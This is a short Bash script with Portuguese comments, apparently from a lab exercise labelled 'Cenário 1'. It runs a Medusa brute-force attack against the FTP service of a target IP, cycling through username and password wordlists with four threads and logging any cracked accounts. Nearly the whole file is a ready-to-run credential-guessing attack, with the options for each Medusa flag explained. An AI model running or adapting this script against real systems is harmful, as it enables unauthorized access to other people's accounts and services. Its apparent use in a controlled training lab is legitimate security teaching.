#!/usr/bin/env bash
# =============================================================================
# 01-brute-ftp.sh
# Cenário 1 — Ataque de força bruta ao serviço FTP (porta 21) com Medusa.
# Uso: ./01-brute-ftp.sh <IP_ALVO>
# Exemplo: ./01-brute-ftp.sh 192.168.56.102
# =============================================================================
set -euo pipefail

ALVO="${1:-192.168.56.102}"
USERS="../wordlists/usuarios.txt"
PASS="../wordlists/senhas.txt"

echo "[*] Iniciando brute force FTP contra ${ALVO}"

# Parâmetros do Medusa:
#   -h  host alvo
#   -U  arquivo de usuários
#   -P  arquivo de senhas
#   -M  módulo do serviço (ftp)
#   -t  threads paralelas (cuidado: muito alto pode travar o serviço)
#   -f  para no primeiro par válido POR HOST
#   -O  grava log das tentativas
medusa -h "${ALVO}" \
       -U "${USERS}" \
       -P "${PASS}" \
       -M ftp \
       -t 4 \
       -f \
       -O "resultado_ftp_${ALVO//./_}.log"

echo "[+] Concluído. Procure por 'ACCOUNT FOUND' no log gerado."
echo "    grep 'ACCOUNT FOUND' resultado_ftp_${ALVO//./_}.log"
